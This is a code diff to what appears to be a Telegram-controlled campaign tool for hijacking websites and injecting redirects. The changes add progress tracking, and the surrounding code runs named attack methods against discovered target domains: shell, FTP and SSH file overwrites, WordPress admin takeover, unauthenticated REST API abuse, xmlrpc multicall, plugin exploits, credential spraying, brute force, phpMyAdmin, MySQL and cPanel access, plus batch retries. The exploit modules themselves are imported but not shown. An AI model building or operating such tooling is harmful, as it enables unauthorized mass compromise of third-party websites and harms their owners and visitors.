@@ -5162,9 +5162,26 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       const stepTakeover = await narrator.addStep("ลองทุกวิธี redirect takeover");
       const s2 = Date.now();
       
+      // Per-method progress: track method index for Telegram display
+      const REDIRECT_METHODS = ["shell_overwrite", "ftp_overwrite", "ssh_overwrite", "wp_admin_takeover", "rest_api_unauth", "xmlrpc_multicall", "plugin_exploit", "credential_spray", "brute_force_takeover", "unified_pipeline_fallback"];
+      let redirectMethodIndex = 0;
+      (narrator as any).config.totalMethods = REDIRECT_METHODS.length;
+      
       const takeoverOutcome = await runStepWithTimeout("redirect_takeover", narrator, async () => {
         const { executeRedirectTakeover } = await import("./redirect-takeover");
-        return executeRedirectTakeover({ targetUrl: effectiveTargetUrl, ourRedirectUrl: redirectUrl });
+        return executeRedirectTakeover({
+          targetUrl: effectiveTargetUrl,
+          ourRedirectUrl: redirectUrl,
+          onProgress: (phase: string, detail: string) => {
+            // Detect method start from progress messages and update narrator
+            const methodMatch = REDIRECT_METHODS.find(m => detail.toLowerCase().includes(m.replace(/_/g, " ")) || detail.toLowerCase().includes(m));
+            if (phase === "takeover" && (detail.includes("Method") || detail.includes("⚡") || detail.includes("📂") || detail.includes("🔐") || detail.includes("🔑") || detail.includes("🌐") || detail.includes("📡") || detail.includes("🔌") || detail.includes("🚀"))) {
+              redirectMethodIndex++;
+              const methodName = detail.replace(/^[^A-Za-z]*/, "").substring(0, 40);
+              narrator.setMethodProgress(redirectMethodIndex, methodName, "🔓");
+            }
+          },
+        });
       }, { heartbeatLabel: "Redirect Takeover" });
       
       let results: Array<{ success: boolean; method: string; detail?: string; injectedUrl?: string }> = [];
@@ -5173,6 +5190,10 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       if (takeoverOutcome.ok) {
         results = takeoverOutcome.result as any;
         succeeded = results.filter(r => r.success);
+        // Record method results for progress display
+        for (const r of results) {
+          narrator.recordMethodResult(r.method, "🔓", r.success);
+        }
       } else {
         const errMsg = takeoverOutcome.timedOut ? "⏰ Redirect Takeover หมดเวลา (3min)" : `Error: ${takeoverOutcome.error.substring(0, 50)}`;
         await narrator.updateStep(stepTakeover, "failed", errMsg, Date.now() - s2);
@@ -7055,6 +7076,7 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       let lastPhase = "initializing";
       let lastEventCount = 0;
       let sessionCompleted = false;
+      let lastTargetsAttacked = 0;
       
       while (Date.now() - heartbeatStart < MAX_HEARTBEAT_DURATION_MS) {
         if (attackEntry.abortController.signal.aborted) break;
@@ -7105,10 +7127,27 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
             await narrator.updateStep(stepIdx, stepStatus);
           }
           
-          // Show stats
+          // Show stats + per-method progress
           if (status.targetsDiscovered || status.targetsAttacked) {
+            const totalTargets = status.targetsDiscovered || status.maxTargetsPerRun || 10;
+            const attacked = status.targetsAttacked || 0;
+            
+            // Update per-method progress counter (target X/Y)
+            if (attacked > lastTargetsAttacked) {
+              (narrator as any).config.totalMethods = totalTargets;
+              narrator.setMethodProgress(attacked, `Target ${attacked}/${totalTargets}`, "⚔️");
+              // Record results for new targets
+              const newSuccesses = (status.targetsSucceeded || 0);
+              const newFails = (status.targetsFailed || 0);
+              if (attacked > lastTargetsAttacked) {
+                const isLatestSuccess = newSuccesses > 0 && attacked === newSuccesses + newFails;
+                narrator.recordMethodResult(`Target ${attacked}`, "⚔️", isLatestSuccess);
+              }
+              lastTargetsAttacked = attacked;
+            }
+            
             await narrator.addAnalysis(
-              `🎯 Targets: ${status.targetsAttacked || 0}/${status.targetsDiscovered || 0} attacked` +
+              `🎯 Targets: ${attacked}/${totalTargets} attacked` +
               (status.targetsSucceeded ? ` | ✅ ${status.targetsSucceeded} success` : "") +
               (status.targetsFailed ? ` | ❌ ${status.targetsFailed} failed` : "")
             );
@@ -7521,6 +7560,10 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
       const stepScan = await narrator.addStep("🔌 สแกนพอร์ต (FTP, MySQL, PHPMyAdmin, cPanel)");
       const s2 = Date.now();
       
+      // Per-method progress: set totalMethods for hijack engine (6 methods)
+      const HIJACK_METHODS = ["xmlrpc_brute", "wp_rest_editor", "phpmyadmin", "mysql_direct", "ftp_access", "cpanel_access"];
+      (narrator as any).config.totalMethods = HIJACK_METHODS.length;
+      
       const hijackOutcome = await runStepWithTimeout("hijack_engine", narrator, async () => {
         const { executeHijackRedirect } = await import("./hijack-redirect-engine");
         return executeHijackRedirect({
@@ -7538,6 +7581,13 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
               ftp_access: "📁 FTP Access",
               cpanel_filemanager: "🖥 cPanel File Manager",
             };
+            // Update per-method progress counter
+            if (methodIndex > 0 && totalMethods > 0) {
+              const methodName = methodLabel[phase] || phase;
+              narrator.setMethodProgress(methodIndex, methodName.replace(/^[^A-Za-z฀-๿]*/, ""), "🔓");
+              // Update totalMethods dynamically (some methods may be skipped)
+              (narrator as any).config.totalMethods = totalMethods;
+            }
             await narrator.addStep(`${methodLabel[phase] || phase}: ${detail.substring(0, 50)}`);
           } catch { /* ignore */ }
         });
@@ -7574,6 +7624,11 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           }),
           hijackMs
         );
+        
+        // Record method results for progress display
+        for (const mr of hijackResult.methodResults) {
+          narrator.recordMethodResult(mr.methodLabel || mr.method, "🔓", mr.success);
+        }
         
         // Log each method result
         for (const mr of hijackResult.methodResults) {
@@ -8029,6 +8084,9 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
         // Step 2: Execute batch retry with progress
         await narrator.startPhase("exploit", `⚡ Retry ${stats.retriable} domains`);
         
+        // Per-method progress: set totalMethods = number of retriable domains
+        (narrator as any).config.totalMethods = stats.retriable;
+        
         let succeeded = 0;
         let failed = 0;
         
@@ -8037,6 +8095,12 @@ async function executeAttackWithProgress(config: TelegramConfig, chatId: number,
           onProgress: async (current, total, result) => {
             if (result.success) succeeded++;
             else failed++;
+            
+            // Update per-method progress counter (domain X/Y)
+            narrator.setMethodProgress(current, `${result.domain} (${result.method})`, result.success ? "✅" : "❌");
+            narrator.recordMethodResult(`${result.domain}`, result.success ? "✅" : "❌", result.success);
+            // Update totalMethods dynamically
+            (narrator as any).config.totalMethods = total;
             
             const icon = result.success ? "✅" : "❌";
             const detail = result.success
